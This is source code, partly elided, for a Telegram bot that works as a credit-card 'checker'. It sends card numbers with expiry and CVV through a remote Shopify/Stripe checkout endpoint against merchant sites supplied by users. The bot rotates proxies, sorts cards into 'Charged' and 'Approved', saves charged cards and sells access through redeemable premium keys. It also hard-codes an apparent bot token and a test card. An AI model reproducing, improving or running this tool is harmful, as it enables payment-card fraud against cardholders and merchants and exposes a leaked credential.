...
BOT_TOKEN = "8228084101:AAF4K6VAqRjqhUQxKyptLokwqbEs6ADcD9g" # Replace with your Bot Token
ADMIN_ID = [7935621079] # Replace with your Admin ID(s)
...
async def _parse_api_response(res):
    """Parse API response from railway app"""
    if res.status != 200:
...
async def check_card_random_site(card, sites, user_id=None):
    ...
    try:
        ...
        url = f'https://sh-production-b12e.up.railway.app/shopify?cc={card}&site={selected_site}'
        timeout = aiohttp.ClientTimeout(total=100)

        proxy = await get_user_proxy(user_id) if user_id else None
        ...
        async with aiohttp.ClientSession(timeout=timeout) as session:
            ...
            async with session.get(url, **kwargs) as res:
                result = await _parse_api_response(res)
                return result, site_index

    except Exception as e:
        # If proxy failed, remove it and retry without proxy
        if proxy and user_id:
            await remove_dead_proxy(user_id, proxy)
            try:
                async with aiohttp.ClientSession(timeout=timeout) as session:
                ...
                return {"Response": str(e2), "Price": "-", "Gateway": "-"}, site_index
...
async def check_card_specific_site(card, site, user_id=None):
    try:
        ...
        url = f'https://sh-production-b12e.up.railway.app/shopify?cc={card}&site={site}'
        timeout = aiohttp.ClientTimeout(total=100)
        ...
        async with aiohttp.ClientSession(timeout=timeout) as session:
            ...
            if proxy:
                kwargs['proxy'] = proxy
            async with session.get(url, **kwargs) as res:
                return await _parse_api_response(res)
        ...
        if proxy and user_id:
            ...
            try:
                ...
                return {"Response": str(e2), "Price": "-", "Gateway": "-"}
...
def is_site_dead(response_text):
    ...
    # Comprehensive dead/error indicators
    dead_indicators = [
        # Payment method / gateway unavailable
        ...
        'this store does not accept payments',
        ...
        'variant id is empty', 'cart is empty', 'line items is empty',

        # URL/Connection errors
        'invalid url', 'invalid domain', 'url rejected', 'malformed input',
        'could not resolve', 'domain name not found', 'name or service not known',
        'empty reply from server', 'connection failed', 'connection reset',
        'connection refused', 'connection closed', 'network error',
        'unreachable', 'timed out', 'timeout', 'socket error',

        # HTTP Status errors
        'http 404', 'http 403', 'http 401', 'http 400', 'http 500',
        'httperror504', 'httperror503', 'httperror502', 'httperror500',
        '502', '503', '504', '500', '400', '401', '403', '404',
        'bad gateway', 'service unavailable', 'gateway timeout',
        'internal server error', 'server error',

        # SSL/Security errors
        'ssl error', 'ssl routines', 'tlsv1 alert', 'certificate verify failed',
        'openssl ssl_connect', 'access denied', 'forbidden', 'unauthorized',
        'cloudflare', 'captcha_required', 'captcha required', 'captcha needed',

        # API/Processing errors
        'error in 1st req', 'error in 1 req', 'error in 2nd req',
        'error in request', 'failed to detect product', 'failed to create checkout',
        'failed to tokenize card', 'failed to get proposal data', 'failed to process',
        'failed to submit', 'submit rejected', 'handle error', 'processing error',
        'checkout error', 'payment error', 'transaction error',

        # Shopify specific errors
        'amount_too_small', 'amount too small', 'amount too large',
        'delivery_delivery_line_detail_changed', 'delivery_address2_required',
        'shipping address invalid', 'billing address invalid',
        'shop not found', 'store not found', 'shopify error',

        # Generic failures
        'site dead', 'site error', 'site errors', 'failed', 'failure',
        'null', 'undefined', 'nan', 'none', 'unknown error'
    ]
    ...
    # Check if response is too short (likely an error code or empty)
    if len(response_text.strip()) < 3:
        return True

    # Check if response contains only error-like patterns (no alphanumeric substance)
    import re
    if not re.search(r'[a-zA-Z]{3,}', response_text):
        return True
...
async def test_single_site(site, test_card="4031630422575208|01|2030|280", user_id=None):
    try:
        ...
        url = f'https://sh-production-b12e.up.railway.app/shopify?cc={test_card}&site={site}'
        ...
        async with aiohttp.ClientSession(timeout=timeout) as session:
            ...
            async with session.get(url, **kwargs) as res:
                ...
                # Strict validation for high-quality working sites
                # 1. Check if response is dead
                if is_site_dead(response_msg): 
                    return {"status": "dead", "response": response_msg, "site": site, "price": price}

                # 2. Check if response is empty or meaningless
                if not response_msg or not response_msg.strip():
                    return {"status": "dead", "response": "Empty response from gateway", "site": site, "price": price}

                # 3. Check if response contains only error patterns without valid payment response
                response_lower = response_msg.lower()
                valid_payment_indicators = [
                    'card', 'cvv', 'cvc', 'declined', 'approved', 'success', 'order',
                    'payment', 'transaction', 'funds', 'zip', 'avs', 'gateway',
                    'insufficient', 'incorrect', 'invalid', 'try again', 'contact',
                    'bank', 'issuer', 'authentication', '3d', 'otp', 'charge'
                ]

                has_valid_indicator = any(ind in response_lower for ind in valid_payment_indicators)

                # 4. If price is suspiciously high or malformed, treat as dead
                price_val = response_json.get("Price", "-")
                if price_val != '-' and price_val != '':
                    try:
                        p = float(str(price_val).replace('$', ''))
                        if p < 0 or p > 1000:  # Unreasonable price
                            return {"status": "dead", "response": f"Invalid price detected: {price_val}", "site": site, "price": price}
                    except:
                        pass

                # 5. Must have valid payment indicator to be considered working
                if not has_valid_indicator and len(response_msg.strip()) < 10:
                    return {"status": "dead", "response": f"No valid payment response: {response_msg}", "site": site, "price": price}

                # Site passed all checks - truly working
...
async def start(event):
    ...
    is_premium = access_type in ["premium_private", "premium_group"]
...
📛 𝗦𝘁𝗮𝘁𝘂𝘀: {status_badge}
🔢 𝗖𝗖 𝗟𝗶𝗺𝗶𝘁: `{cc_limit} 𝗖𝗖𝘀`
🌐 𝗔𝗰𝗰𝗲𝘀𝘀: `{'𝗣𝗿𝗶𝘃𝗮𝘁𝗲 + 𝗚𝗿𝗼𝘂𝗽' if is_premium or is_admin else '𝗚𝗿𝗼𝘂𝗽 𝗢𝗻𝗹𝘆'}`
...
• `/st` ➜ 𝗦𝗶𝗻𝗴𝗹𝗲 𝗦𝘁𝗿𝗶𝗽𝗲
• `/mst` ➜ 𝗠𝘂𝗹𝘁𝗶𝗽𝗹𝗲 𝗦𝘁𝗿𝗶𝗽𝗲
• `/mstxt` ➜ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗳𝗿𝗼𝗺 .𝘁𝘅𝘁
• `/sadd` ➜ 𝗔𝗱𝗱 𝗦𝘁𝗿𝗶𝗽𝗲 𝗦𝗶𝘁𝗲

🌐 𝗦𝗶𝘁𝗲𝘀
• `/add` ➜ 𝗔𝗱𝗱 𝗦𝗶𝘁𝗲𝘀 (𝗼𝗿 𝗿𝗲𝗽𝗹𝘆 𝘁𝗼 .𝘁𝘅𝘁)
• `/rm` ➜ 𝗥𝗲𝗺𝗼𝘃𝗲 𝗦𝗶𝘁𝗲𝘀
• `/check` ➜ 𝗧𝗲𝘀𝘁 𝗦𝗶𝘁𝗲𝘀
• `/info` ➜ 𝗠𝘆 𝗣𝗿𝗼𝗳𝗶𝗹𝗲
...
async def generate_keys(event):
    ...
    try:
        parts = event.raw_text.split()
        if len(parts) != 3: 
            return await event.reply("""⚠️ **𝙒𝙧𝙤𝙣𝙜 𝙁𝙤𝙧𝙢𝙖𝙩!**

📝 **𝙐𝙨𝙖𝙜𝙚:** `/key <amount> <days>`
📌 **𝙀𝙭𝙖𝙢𝙥𝙡𝙚:** `/key 5 30`

💡 **𝙈𝙖𝙭 10 𝙠𝙚𝙮𝙨 𝙥𝙚𝙧 𝙘𝙤𝙢𝙢𝙖𝙣𝙙**""")
        amount = int(parts[1])
        days = int(parts[2])
        if amount > 10: 
            return await event.reply("❌ 𝙈𝙖𝙭𝙞𝙢𝙪𝙢 10 𝙠𝙚𝙮𝙨 𝙖𝙩 𝙤𝙣𝙘𝙚!")
        if amount < 1 or days < 1:
            return await event.reply("❌ 𝘼𝙢𝙤𝙪𝙣𝙩 𝙖𝙣𝙙 𝙙𝙖𝙮𝙨 𝙢𝙪𝙨𝙩 𝙗𝙚 𝙖𝙩 𝙡𝙚𝙖𝙨𝙩 1!")
        ...
        response = f"""🎉 **𝙆𝙀𝙔𝙎 𝙂𝙀𝙉𝙀𝙍𝘼𝙏𝙀𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔!**

📊 **𝘿𝙚𝙩𝙖𝙞𝙡𝙨:**
├─ 📝 𝘼𝙢𝙤𝙪𝙣𝙩: `{amount}`
├─ 📅 𝘿𝙖𝙮𝙨: `{days}`
├─ 👤 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙 𝘽𝙮: `@{event.sender_id}`
└─ 🕐 𝘾𝙧𝙚𝙖𝙩𝙚𝙙: `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}`
...
💡 **𝙃𝙤𝙬 𝙩𝙤 𝙍𝙚𝙙𝙚𝙚𝙢:**
𝙏𝙮𝙥𝙚 `/redeem <key>`
📌 **𝙀𝙭𝙖𝙢𝙥𝙡𝙚:** `/redeem {generated_keys[0]}`

⚠️ **𝙆𝙚𝙮𝙨 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙗𝙚 𝙪𝙨𝙚𝙙 𝙤𝙣𝙘𝙚!**"""

        await event.reply(response)

    except ValueError: 
        await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙖𝙢𝙤𝙪𝙣𝙩 𝙤𝙧 𝙙𝙖𝙮𝙨! 𝙐𝙨𝙚 𝙣𝙪𝙢𝙗𝙚𝙧𝙨 𝙤𝙣𝙡𝙮.")
    except Exception as e: 
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/keys'))
async def view_keys(event):
    if event.sender_id not in ADMIN_ID: 
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")
    try:
        keys_data = await load_json(KEYS_FILE)
        if not keys_data:
            return await event.reply("📭 **𝙉𝙤 𝙠𝙚𝙮𝙨 𝙛𝙤𝙪𝙣𝙙!**\n\n𝙐𝙨𝙚 `/key <amount> <days>` 𝙩𝙤 𝙜𝙚𝙣𝙚𝙧𝙖𝙩𝙚.")
        ...
        # Show recent 20 keys
        recent_keys = list(keys_data.items())[-20:]

        key_list = []
        for key, data in reversed(recent_keys):
            status = "✅ 𝙐𝙨𝙚𝙙" if data.get('used') else "⏳ 𝘼𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚"
            days = data.get('days', 'N/A')
            used_by = data.get('used_by', 'N/A')

            if data.get('used'):
                key_list.append(f"🔑 `{key}` | {status} | 📅 {days}d | 👤 `{used_by}`")
            else:
                key_list.append(f"🔑 `{key}` | {status} | 📅 {days}d")

        keys_text = "\n".join(key_list)

        response = f"""🔐 **𝙆𝙀𝙔 𝙈𝘼𝙉𝘼𝙂𝙀𝙈𝙀𝙉𝙏**

📊 **𝙎𝙩𝙖𝙩𝙞𝙨𝙩𝙞𝙘𝙨:**
├─ 🔢 𝙏𝙤𝙩𝙖𝙡: `{total_keys}`
├─ ✅ 𝙐𝙨𝙚𝙙: `{used_keys}`
└─ ⏳ 𝘼𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚: `{unused_keys}`

📋 **𝙍𝙚𝙘𝙚𝙣𝙩 𝙆𝙚𝙮𝙨** (𝙇𝙖𝙨𝙩 20):
{keys_text}

💡 **𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨:**
• `/key <amount> <days>` - 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙚
• `/redeem <key>` - 𝙍𝙚𝙙𝙚𝙚𝙢"""
...
💡 𝙂𝙚𝙩 𝙖 𝙠𝙚𝙮 𝙛𝙧𝙤𝙢 𝙖𝙙𝙢𝙞𝙣 𝙤𝙧 𝙗𝙪𝙮 𝙤𝙣𝙚!""")

        key = parts[1].upper()
        keys_data = await load_json(KEYS_FILE)

        if key not in keys_data: 
            return await event.reply("""❌ **𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙆𝙚𝙮!**

🔍 𝙏𝙝𝙚 𝙠𝙚𝙮 𝙮𝙤𝙪 𝙚𝙣𝙩𝙚𝙧𝙚𝙙 𝙞𝙨 𝙣𝙤𝙩 𝙫𝙖𝙡𝙞𝙙.
📞 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 𝙖𝙙𝙢𝙞𝙣 𝙛𝙤𝙧 𝙖 𝙫𝙖𝙡𝙞𝙙 𝙠𝙚𝙮.""")

        if keys_data[key]['used']: 
            used_by = keys_data[key].get('used_by', '𝙐𝙣𝙠𝙣𝙤𝙬𝙣')
            used_at = keys_data[key].get('used_at', '𝙐𝙣𝙠𝙣𝙤𝙬𝙣')
            return await event.reply(f"""❌ **𝙆𝙚𝙮 𝘼𝙡𝙧𝙚𝙖𝙙𝙮 𝙐𝙨𝙚𝙙!**

🔑 𝙆𝙚𝙮: `{key}`
👤 𝙐𝙨𝙚𝙙 𝘽𝙮: `{used_by}`
🕐 𝙐𝙨𝙚𝙙 𝘼𝙩: `{used_at}`

📞 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 𝙖𝙙𝙢𝙞𝙣 𝙛𝙤𝙧 𝙖 𝙣𝙚𝙬 𝙠𝙚𝙮.""")
        ...
        await event.reply(f"""🎉 **𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝘼𝘾𝘾𝙀𝙎𝙎 𝘼𝘾𝙏𝙄𝙑𝘼𝙏𝙀𝘿!**

✅ **𝙆𝙚𝙮 𝙍𝙚𝙙𝙚𝙚𝙢𝙚𝙙 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮!**
...
async def add_site(event):
    ...
    try:
        ...
        # Check if user replied to a document (txt file)
        if event.reply_to_msg_id and not add_text:
            replied_msg = await event.get_reply_message()
            if replied_msg and replied_msg.document:
                # Check if it's a txt file
                file_name = replied_msg.file.name if replied_msg.file else ""
                if file_name.endswith('.txt') or not file_name:
                    processing_msg = await event.reply("📥 **𝘿𝙤𝙬𝙣𝙡𝙤𝙖𝙙𝙞𝙣𝙜 𝙛𝙞𝙡𝙚...**")
                    try:
                        ...
                        # Extract sites from file content
                        file_sites = extract_urls_from_text(file_content)
                        if file_sites:
                            sites_to_add = file_sites
                            await processing_msg.edit(f"📄 **𝙁𝙞𝙡𝙚 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙!**\n✅ 𝙁𝙤𝙪𝙣𝙙 `{len(sites_to_add)}` 𝙨𝙞𝙩𝙚(𝙨) 𝙞𝙣 𝙛𝙞𝙡𝙚.")
                            await asyncio.sleep(1)
                        else:
                            await processing_msg.delete()
                            return await event.reply("❌ **𝙉𝙤 𝙫𝙖𝙡𝙞𝙙 𝙨𝙞𝙩𝙚𝙨 𝙛𝙤𝙪𝙣𝙙 𝙞𝙣 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚!**")
                    except Exception as e:
                        try: os.remove(file_path)
                        except: pass
                        return await event.reply(f"❌ **𝙀𝙧𝙧𝙤𝙧 𝙧𝙚𝙖𝙙𝙞𝙣𝙜 𝙛𝙞𝙡𝙚:** `{str(e)}`")
                else:
                    return await event.reply("❌ **𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 `.𝙩𝙭𝙩` 𝙛𝙞𝙡𝙚!**")
            else:
                return await event.reply("❌ **𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙩𝙚𝙭𝙩 𝙛𝙞𝙡𝙚 𝙤𝙧 𝙩𝙮𝙥𝙚 𝙨𝙞𝙩𝙚𝙨!**")
        ...
        if not sites_to_add:
            return await event.reply("""⚠️ **𝙉𝙤 𝙨𝙞𝙩𝙚𝙨 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙!**

📝 **𝙐𝙨𝙖𝙜𝙚:**
• `/add site1.com site2.com`
• `/add` (𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 .𝙩𝙭𝙩 𝙛𝙞𝙡𝙚)

📌 **𝙀𝙭𝙖𝙢𝙥𝙡𝙚:** `/add shop1.com shop2.com`""")
        ...
        for site in sites_to_add:
            if not is_valid_url_or_domain(site):
                invalid_sites.append(site)
            elif site in user_sites:
        ...
        if added_sites:
            added_text = "✅ **𝙎𝙞𝙩𝙚𝙨 𝘼𝙙𝙙𝙚𝙙:**\n" + "\n".join(f"• `{s}`" for s in added_sites)
            response_parts.append(added_text)

        if already_exists:
            exists_text = "⚠️ **𝘼𝙡𝙧𝙚𝙖𝙙𝙮 𝙀𝙭𝙞𝙨𝙩𝙨:**\n" + "\n".join(f"• `{s}`" for s in already_exists)
            response_parts.append(exists_text)

        if invalid_sites:
            invalid_text = "❌ **𝙄𝙣𝙫𝙖𝙡𝙞𝙙:**\n" + "\n".join(f"• `{s}`" for s in invalid_sites)
            response_parts.append(invalid_text)

        if response_parts:
            summary = f"""📊 **𝘼𝘿𝘿 𝙍𝙀𝙎𝙐𝙇𝙏𝙎**

├─ ✅ 𝘼𝙙𝙙𝙚𝙙: `{len(added_sites)}`
├─ ⚠️ 𝙀𝙭𝙞𝙨𝙩𝙨: `{len(already_exists)}`
├─ ❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙: `{len(invalid_sites)}`
└─ 📊 𝙏𝙤𝙩𝙖𝙡 𝙞𝙣 𝘿𝘽: `{len(user_sites)}`
...
async def process_sh_card(event, access_type):
    ...
    try:
        ...
        is_charged = False
        if "charged" in response_text or "charged" in status_text or "order_placed" in response_text:
        ...
        elif "thank you" in response_text or "payment successful" in response_text or "order_placed" in response_text:
            status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
            status_result = "Charged"
            is_charged = True
            await save_approved_card(card, status_result, res.get('Response'), res.get('Gateway'), res.get('Price'))
        elif any(key in response_text for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds", "3d", "otp"]):
...
async def process_msh_cards(event, cards, sites):
    ...
    for i in range(0, len(cards), batch_size):
        ...
        for card in batch:
            ...
            task_sites.append(current_site)
        ...
        for j, (card, result, site_used) in enumerate(zip(batch, results, task_sites)):
            if isinstance(result, Exception):
                result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}

            response_text = result.get("Response", "")

            # Remove dead sites immediately
            if is_site_dead(response_text):
                if site_used in sites:
                    sites.remove(site_used)
                    all_sites_data = await load_json(SITE_FILE)
                    if str(event.sender_id) in all_sites_data and site_used in all_sites_data[str(event.sender_id)]:
                        all_sites_data[str(event.sender_id)].remove(site_used)
            ...
            elapsed_time = round(time.time() - batch_start_time, 2)
            brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
            ...
            # Check for charged status
            is_charged = False
            if "charged" in response_text_lower or "charged" in status_text_lower or "order_placed" in response_text_lower:
                status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                status_result = "Charged"
                is_charged = True
            ...
            elif "thank you" in response_text_lower or "payment successful" in response_text_lower or "order_placed" in response_text_lower:
                status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                status_result = "Charged"
                is_charged = True
                await save_approved_card(card, status_result, result.get('Response'), result.get('Gateway'), result.get('Price'))
            elif any(key in response_text_lower for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds", "3d", "otp"]):
                status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                status_result = "Approved"
            ...
            try:
                display_site_index = sites.index(site_used) + 1 if site_used in sites else "?"
            except:
                display_site_index = "?"
...
"""
                ...
                # 3D/OTP cards now go to APPROVED
                brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
...
"""
                    result_msg = await event.reply(card_msg)
                    # Pin if charged
                    if "charged" in response_text_lower or "charged" in status_text_lower or "thank you" in response_text_lower or "payment successful" in response_text_lower or "order_placed" in response_text_lower:
...
"""
            ...
            for j, (result, (card, site_used)) in enumerate(zip(results, task_cards)):
                ...
                # Skip dead sites for /ran (don't remove from global_sites list)
                if is_site_dead(response_text):
                    declined += 1
                    continue
